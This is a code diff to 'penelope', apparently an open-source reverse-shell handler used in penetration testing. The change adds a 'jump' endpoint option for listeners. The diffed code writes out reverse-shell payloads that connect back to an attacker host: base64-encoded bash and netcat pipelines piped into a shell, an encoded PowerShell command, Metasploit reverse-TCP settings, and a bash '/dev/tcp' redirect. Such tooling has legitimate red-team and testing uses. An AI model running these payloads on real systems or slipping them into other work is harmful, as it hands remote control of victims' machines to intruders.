@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.15.2"
+__version__ = "0.15.3"
 
 import os
 import io
@@ -1288,6 +1288,7 @@ class MainMenu(BetterCMD):
 			parser_add.add_argument("-i", "--interface", help="Interface to bind", default="any")
 			parser_add.add_argument("-p", "--ports", help="Ports to listen on (comma separated)", default=[options.default_listener_port])
 			parser_add.add_argument("-t", "--type", help="Listener type", default='tcp')
+			parser_add.add_argument("-j", "--jump", action="append", help="Jump endpoint")
 
 			parser_stop = subparsers.add_parser("stop", help="Stop a listener")
 			parser_stop.add_argument("id", help="Listener ID to stop")
@@ -1301,7 +1302,7 @@ class MainMenu(BetterCMD):
 				options.ports = args.ports
 				if args.type == 'tcp':
 					for port in options.ports:
-						TCPListener(args.interface, port)
+						TCPListener(args.interface, port, args.jump)
 
 			elif args.command == "stop":
 				if args.id == '*':
@@ -1830,10 +1831,18 @@ def Connect(host, port):
 
 class TCPListener:
 
-	def __init__(self, host=None, port=None):
+	def __init__(self, host=None, port=None, jump=None):
 		self.host = host or options.default_interface
 		self.host = Interfaces().translate(self.host)
 		self.port = port or options.default_listener_port
+		self.jump = []
+		if jump:
+			for j in jump:
+				try:
+					self.jump.append(tuple(j.split(':')))
+				except:
+					logger.error(f"Invalid jump endpoint: {j}")
+
 		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		self.socket.setblocking(False)
@@ -1911,28 +1920,36 @@ class TCPListener:
 
 		if self.host == '0.0.0.0':
 			ips = [ip for ip in interfaces.values()]
+		if self.jump:
+			ips[:0] = self.jump
 
 		interface_count = 0
 		for ip in ips:
-			iface_name = {v: k for k, v in interfaces.items()}.get(ip)
-			if interface_filter and iface_name != interface_filter:
-				continue
+			if isinstance(ip, tuple):
+				ip, port = ip
+				iface_name = paint('JUMP').RED
+			else:
+				port = self.port
+				iface_name = {v: k for k, v in interfaces.items()}.get(ip)
+				if interface_filter and iface_name != interface_filter:
+					continue
+				iface_name = paint(iface_name).GREEN
 			interface_count += 1
-			output.extend((f'➤  {str(paint(iface_name).GREEN)} → {str(paint(ip).cyan)}:{str(paint(self.port).red)}', ''))
+			output.extend((f'➤  {iface_name} → {str(paint(ip).cyan)}:{str(paint(port).red)}', ''))
 			output.append(str(paint("Bash TCP").UNDERLINE))
-			output.append(f"printf {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
+			output.append(f"printf {base64.b64encode(presets[0].format(ip, port).encode()).decode()}|base64 -d|bash")
 			output.append("")
 			output.append(str(paint("Netcat + named pipe").UNDERLINE))
-			output.append(f"printf {base64.b64encode(presets[1].format(ip, self.port).encode()).decode()}|base64 -d|sh")
+			output.append(f"printf {base64.b64encode(presets[1].format(ip, port).encode()).decode()}|base64 -d|sh")
 			output.append("")
 			output.append(str(paint("Powershell").UNDERLINE))
-			output.append("cmd /c powershell -e " + base64.b64encode(presets[2].format(ip, self.port).encode("utf-16le")).decode())
+			output.append("cmd /c powershell -e " + base64.b64encode(presets[2].format(ip, port).encode("utf-16le")).decode())
 
 			output.extend(dedent(f"""
 			{paint('Metasploit').UNDERLINE}
 			set PAYLOAD generic/shell_reverse_tcp
 			set LHOST {ip}
-			set LPORT {self.port}
+			set LPORT {port}
 			set DisablePayloadHandler true
 			""").split("\n"))
 
@@ -3724,11 +3741,24 @@ class Session:
 		if self.OS == "Unix":
 			if any([self.listener, port, host]):
 
-				port = port or self._port
-				host = host or self._host
+				if self.listener.jump:
+					if len(self.listener.jump) == 1:
+						host, port = self.listener.jump[0]
+					else:
+						[print(f"* {j[0]}:{j[1]}") for j in self.listener.jump]
+						while(True):
+							e = ask("Endpoint: ")
+							try:
+								host, port = e.split(':')
+								break
+							except:
+								logger.error(f"Invalid jump endpoint: {e}")
+				else:
+					port = port or self._port
+					host = host or self._host
 
-				if not next((listener for listener in core.listeners.values() if listener.port == port), None):
-					new_listener = TCPListener(host, port)
+					if not next((listener for listener in core.listeners.values() if listener.port == port), None):
+						new_listener = TCPListener(host, port)
 
 				if self.bin['bash']:
 					cmd = f'printf "(bash >& /dev/tcp/{host}/{port} 0>&1) &"|bash'
@@ -5157,6 +5187,7 @@ def main():
 	method = parser.add_argument_group("Reverse or Bind shell?")
 	method.add_argument("-i", "--interface", help="Local interface/IP to listen. (Default: 0.0.0.0)", metavar='')
 	method.add_argument("-c", "--connect", help="Bind shell Host", metavar='')
+	method.add_argument("-j", "--jump", help="Reverse shell jump endpoint", action="append", metavar='')
 
 	hints = parser.add_argument_group("Hints")
 	hints.add_argument("-a", "--payloads", help="Show sample reverse shell payloads for active Listeners", action="store_true")
@@ -5260,7 +5291,7 @@ def main():
 	# Reverse Listeners
 	else:
 		for port in options.ports:
-			TCPListener(host=options.interface, port=port)
+			TCPListener(host=options.interface, port=port, jump=options.jump)
 			if not core.listeners:
 				sys.exit(1)
 
